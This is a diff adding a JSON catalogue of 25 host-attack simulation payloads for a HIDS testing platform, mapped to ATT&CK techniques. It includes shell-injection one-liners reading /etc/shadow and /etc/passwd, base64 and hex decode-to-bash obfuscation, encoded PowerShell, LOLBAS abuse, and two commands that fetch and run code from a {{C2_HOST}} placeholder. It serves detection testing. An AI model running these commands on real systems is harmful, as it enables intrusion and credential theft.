@@ -1,0 +1,937 @@
+[
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: bash -c id",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-001",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/bin/bash -c 起子 shell 执行 id（最基础命令注入）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "bash -c 'id; whoami; hostname; uname -a'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:bash",
+      "syscall:execve"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: sh -c whoami",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-002",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "POSIX sh 调用，避开 bash-only 关键字过滤。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "sh -c 'whoami;cat /etc/passwd|head -3'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:sh"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: dash -c",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-003",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "dash 调用（Ubuntu 默认 /bin/sh -> dash，少功能 = 少日志特征）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "dash -c 'id'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:dash"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: python -c os.system",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-004",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Python -c 内联 os.system 执行命令。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.006"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "python3 -c 'import os;os.system(\"id;cat /etc/shadow|head -3\")'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:python3"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: python -c subprocess",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-005",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Python subprocess.Popen + shell=True。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.006"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "python3 -c 'import subprocess;subprocess.Popen(\"id\",shell=True)'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:python3"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: perl -e system",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-006",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Perl one-liner 执行系统命令。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.006"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "perl -e 'system(\"id; cat /etc/group\")'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:perl"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: php -r system",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-007",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "PHP -r 通过 system() 执行命令。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "php -r 'system(\"id;ls -la /etc/cron.d/\");'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:php"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: php passthru",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-008",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "PHP passthru 直接打印命令结果。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "php -r 'passthru(\"uname -a\");'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:php"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: ruby system",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-009",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Ruby system() 调用。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "ruby -e 'system(\"id\")'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:ruby"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: lua os.execute",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-010",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Lua os.execute（OpenWrt / 嵌入式）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "lua -e 'os.execute(\"id\")'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:lua"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: awk system",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-011",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "awk 内置 system() 函数。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "awk 'BEGIN{system(\"id\")}'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:awk"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: env shell exec",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-012",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "GTFOBins env -i + bash 绕过受限 shell 执行命令。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "env -i /bin/bash -c 'id'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:env",
+      "proc:bash"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: find -exec",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-013",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "find -exec / -execdir 触发任意命令（GTFOBins）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "find / -maxdepth 1 -name etc -exec /bin/sh \\;",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:find",
+      "proc:sh"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: xargs sh",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-014",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "echo + xargs sh 拼出命令注入。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "echo 'id;whoami' | xargs -I {} sh -c '{}'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:xargs",
+      "proc:sh"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: eval $(curl)",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-015",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "eval $(curl ...) 拉远端命令并执行。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "eval $(curl -s http://{{C2_HOST}}/cmd)",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:curl",
+      "http_outbound:{{C2_HOST}}",
+      "proc:bash"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: base64 decode + exec",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-016",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "base64 -d | bash 解码执行（规避字符串匹配）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1027"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "echo aWQ= | base64 -d | bash",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:base64",
+      "proc:bash"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: xxd hex decode + exec",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-017",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "hex 编码 + xxd 解码 + bash 执行。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1027"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "echo 6964 | xxd -r -p | bash",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:xxd",
+      "proc:bash"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: bash $()",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-018",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "bash $() 命令替换（HTTP 参数注入常见形态）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "echo $(id;hostname)",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:bash"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: bash backtick",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-019",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "bash backtick 命令替换。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "echo `id`",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:bash"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: heredoc",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-020",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "bash heredoc 多行注入。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "bash << 'EOF'\nid\nuname -a\nEOF",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:bash"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: cmd.exe /c",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-021",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Windows cmd.exe /c 标准命令执行。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "cmd.exe /c \"whoami /all & ipconfig /all\"",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:cmd.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: powershell -enc",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-022",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Powershell -EncodedCommand 执行 base64 编码命令。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "powershell -enc dwBoAG8AYQBtAGkA",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:powershell.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: wmic process call",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-023",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "wmic process call create 创建任意进程（LOLBAS）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1218"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "wmic process call create \"calc.exe\"",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:wmic.exe",
+      "proc:calc.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: rundll32 javascript",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-024",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "rundll32 + javascript 协议执行任意脚本。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1218.011"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\")",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:rundll32.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Command Execution: regsvr32 sct",
+    "payload_external_id": "HIDS-COMMANDEXECUTION-025",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "regsvr32 + scriptlet 远端执行（squiblydoo）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1218.010"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "command_execution"
+    ],
+    "hids_category": "command_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "regsvr32.exe /s /n /u /i:http://{{C2_HOST}}/file.sct scrobj.dll",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:regsvr32.exe",
+      "http_outbound:{{C2_HOST}}"
+    ]
+  }
+]
